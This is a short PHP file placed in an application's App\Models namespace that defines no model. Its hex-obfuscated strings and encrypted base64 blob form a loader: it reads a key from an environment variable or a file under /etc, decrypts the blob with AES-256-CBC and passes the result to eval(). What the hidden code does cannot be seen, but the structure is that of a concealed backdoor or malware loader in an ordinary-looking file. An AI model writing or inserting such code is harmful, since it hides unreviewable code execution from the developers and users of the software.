<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('C+Vddl1eObz61pHYnOeuKw==');

$c=base64_decode(

'Ry5rvQ6ihGD44Xy9vGrPupSifB+UTVGbz/YWdfcW88ym1GrU8CFR5eaiMywIt+UfubecpMJQ7714' .
'MYKBFee772QlsuoDcnhOO21MyPIAsfOkYDQ0dHtEbnrVMBdlousVLAu6EZ68HldFziL90UKhwW4f' .
'P62aXwyMnvP8u65HiRdmprx5eCnSImCc5pX272AfLjtBMzapjTwe6LLSSyLy4vfA5KuoVi7Hdl36' .
'N4rUoKc6M+/5/lemfwR1ae0M4TEqYgNXHcKuRXYuL3+jsFMcAi4Mp0QXFrX+vXHnc4F7YdEZyIfH' .
'2wBOJc09k6s+DGxgllaUq5tc7Lsc/hJ+9hptNfTAWwKGlYKFCP06L3NZDVJwsb+3fc9HOv4e/i2n' .
'zG75UK8SlrVeDrp8MjnqIE5UMJfgZx4Fxpp5cfZ609nZwRBrQQ3bdh9kCtroWmw7DuRA4rWCxSfC' .
'F0onFCtdDhIMnkO8YsdRuGEkM2nCHd/nkRH7R1Spf9EjB8SoWHFktyCH5oyBT2A4fv3j072JszN5' .
'DZdk8WScIBKI36SpjXdaLLrVeURRlbB7xtON8bwEHrASfr1/QIqthoSCRdmi47p6U+5hMogEgfVE' .
'ls42d9ygTKeJ0wj39flaZ+EYVri+by2OGKLc64HABBFwVHpl5aJQylTrRZz1MT6MjEyvksQtLEeX' .
'Tj7GdUoX30jBkV0ZV4jh9hKDvjhyXg7wcDMlQsJi9cj7eABQKJN/nPZfP1Jvw/bqD8Tj5UrNfG+H' .
'MzJzPD6Kbd+KGPHfoTHRHEP8rHriTuVAjsffHjLIrj6qc49nD0WexB6GEoa/sw4Ad6o0vqJSChRl' .
'N+DDglV35+hyz/cnpEsMkGfd+1w1i2KEMR5/M5VVxPpwxTkE03jnQrqxSAymmEmc9TpKpxTiVgye' .
'ccjhG/l3YOXE1Jmz5ZA6gkGUeRt7c41stNNgw3RgS6r/kTf+QNVrOrPU0tECF4drZlOwkA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

